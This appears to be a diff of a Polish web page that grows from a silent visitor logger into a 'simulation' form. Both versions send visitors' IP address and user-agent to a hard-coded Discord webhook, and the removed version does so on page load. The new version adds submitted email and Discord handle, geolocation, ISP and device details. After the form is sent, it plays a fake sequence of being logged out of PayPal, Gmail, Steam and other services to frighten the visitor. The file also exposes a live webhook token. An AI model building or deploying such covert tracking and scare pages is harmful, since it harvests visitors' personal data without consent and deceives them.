@@ -1,59 +1,214 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-    <meta charset="UTF-8">
-    <title>Strona Testowa</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Symulacja UI</title>
+<style>
+body{
+  margin:0;
+  font-family:Segoe UI, Arial, sans-serif;
+  background:#111;
+  color:#fff;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  overflow:hidden;
+}
+.container{
+  background:#23272a;
+  padding:24px;
+  border-radius:10px;
+  width:340px;
+  box-shadow:0 0 20px rgba(0,0,0,.7);
+  z-index:3;
+}
+input, textarea, button{
+  width:100%;
+  margin:8px 0;
+  padding:10px;
+  border:none;
+  border-radius:6px;
+  background:#40444b;
+  color:#fff;
+}
+button{
+  background:#7289da;
+  font-weight:bold;
+  cursor:pointer;
+}
+h2{ color:#7289da; margin-top:0; }
+
+/* Overlay + lewy panel */
+#overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.85);
+  display:none;
+  z-index:1;
+}
+#logout-box{
+  position:absolute;
+  top:50%;
+  left:30px;              /* PO LEWEJ */
+  transform:translateY(-50%);
+  width:420px;
+  background:#0b0b0b;
+  border:2px solid #ff004c;
+  padding:16px;
+  z-index:2;
+}
+#logout-box h3{ color:#ff004c; margin:0 0 10px; }
+#logs{
+  list-style:none;
+  padding:0;
+  margin:0;
+  max-height:220px;
+  overflow:hidden;
+  font-family:monospace;
+  font-size:13px;
+}
+#logs li{ margin:4px 0; color:#ccc; }
+small{ opacity:.6; }
+
+/* Prawy panel wideo */
+#video-panel{
+  position:fixed;
+  top:0;
+  right:0;
+  width:40vw;
+  height:100vh;
+  display:none;           /* POJAWIA SIĘ PO FORMULARZU */
+  z-index:0;
+}
+#video-panel video{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  filter:brightness(.6) contrast(1.2);
+}
+</style>
 </head>
 <body>
-    <h1>Strona działa</h1>
-    <p>Sprawdź kanał na Discordzie.</p>
 
-    <script>
-        async function sendToDiscord() {
-            // Upewnij się, że ten link jest w 100% poprawny
-            const webhookUrl = "https://discord.com/api/webhooks/1459601451671359640/D2o79yB19OC3MbE73wJb9kUEU-dyBBhiN4e2LPAUvqCQkVwOqLT2-iZ0RAlakc_pjmqJ";
+<div id="form" class="container">
+  <h2>Formularz</h2>
+  <input id="email" type="email" placeholder="Email" required>
+  <input id="discord" type="text" placeholder="Discord">
+  <textarea id="msg" placeholder="Wiadomość"></textarea>
+  <button onclick="send()">Wyślij</button>
+</div>
 
-            try {
-                // 1. Pobieranie IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+<div id="info" class="container" style="display:none;">
+  <h2>Twoje dane</h2>
+  <div id="out"></div>
+  <small> </small>
+</div>
 
-                // 2. Budowanie poprawnej paczki danych (JSON)
-                const payload = {
-                    "username": "Logger Bot",
-                    "content": "Wykryto nowe wejście na stronę!",
-                    "embeds": [{
-                        "title": "Szczegóły wizyty",
-                        "color": 16711680, // Czerwony
-                        "fields": [
-                            { "name": "Adres IP", "value": ipData.ip },
-                            { "name": "User-Agent", "value": navigator.userAgent }
-                        ]
-                    }]
-                };
+<div id="overlay">
+  <div id="logout-box">
+    <h3 id="count">Zamykanie sesji…</h3>
+    <ul id="logs"></ul>
+    <small> </small>
+  </div>
+</div>
 
-                // 3. Wysyłka z wymuszonym nagłówkiem JSON
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+<div id="video-panel">
+  <video id="bgvideo" loop playsinline>
+    <source src="https://files.catbox.moe/jvabho.mp4">
+  </video>
+</div>
 
-                if (response.ok) {
-                    console.log("Sukces! Wiadomość wysłana.");
-                } else {
-                    console.error("Błąd serwera Discord:", response.status);
-                }
+<audio id="beep" src="error.mp3" preload="auto"></audio>
+<audio id="music" src="music.mp3" preload="auto" loop></audio>
 
-            } catch (error) {
-                console.error("Błąd krytyczny:", error);
-            }
-        }
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1459601451671359640/D2o79yB19OC3MbE73wJb9kUEU-dyBBhiN4e2LPAUvqCQkVwOqLT2-iZ0RAlakc_pjmqJ"
 
-        // Wywołanie funkcji
-        sendToDiscord();
-    </script>
+const services = [
+  "YouTube","Discord","Google","Gmail","Facebook","Instagram","Steam",
+  "Spotify","Netflix","Microsoft","Apple ID","GitHub","Reddit","Twitter",
+  "Amazon","PayPal","TikTok","LinkedIn","Telegram","Epic Games"
+]
+
+function fakeSequence(){
+  document.getElementById("overlay").style.display="block"
+  const logs=document.getElementById("logs")
+  const countEl=document.getElementById("count")
+  const beep=document.getElementById("beep")
+  let i=0
+  const iv=setInterval(()=>{
+    if(i>=services.length){
+      countEl.innerText="Symulacja zakończona"
+      clearInterval(iv); return
+    }
+    countEl.innerText="Zamykanie sesji…"
+    const li=document.createElement("li")
+    li.textContent="⛔ Wylogowywanie z "+services[i]+"…"
+    logs.appendChild(li)
+    if(i%3===0) beep.play().catch(()=>{})
+    i++
+  },700)
+}
+
+async function send(){
+  try{
+    const ipRes=await fetch("https://ipapi.co/json/")
+    const ip=await ipRes.json()
+
+    const data={
+      email:email.value,
+      discord:discord.value||"brak",
+      message:msg.value||"brak",
+      ip:ip.ip,
+      city:ip.city,
+      region:ip.region,
+      country:ip.country_name,
+      isp:ip.org,
+      timezone:ip.timezone,
+      ua:navigator.userAgent,
+      platform:navigator.platform,
+      language:navigator.language,
+      screen:screen.width+"x"+screen.height,
+      cookies:navigator.cookieEnabled
+    }
+
+    await fetch(WEBHOOK_URL,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({
+        embeds:[{
+          title:"Demo formularz",
+          color:7506394,
+          fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v)})),
+          timestamp:new Date()
+        }]
+      })
+    })
+
+    // UI przejście
+    form.style.display="none"
+    info.style.display="block"
+    out.innerHTML=Object.entries(data).map(([k,v])=>`<p><b>${k}:</b> ${v}</p>`).join("")
+
+    // WIDEO + MUZYKA (po kliknięciu – dozwolone)
+    const vp=document.getElementById("video-panel")
+    const vid=document.getElementById("bgvideo")
+    const music=document.getElementById("music")
+    vp.style.display="block"
+    vid.muted=false
+    vid.volume=0.6
+    vid.play().catch(()=>{})
+    music.volume=0.35
+    music.play().catch(()=>{})
+
+    fakeSequence()
+  }catch(e){
+    alert("Błąd demonstracji.")
+  }
+}
+</script>
+
 </body>
 </html>
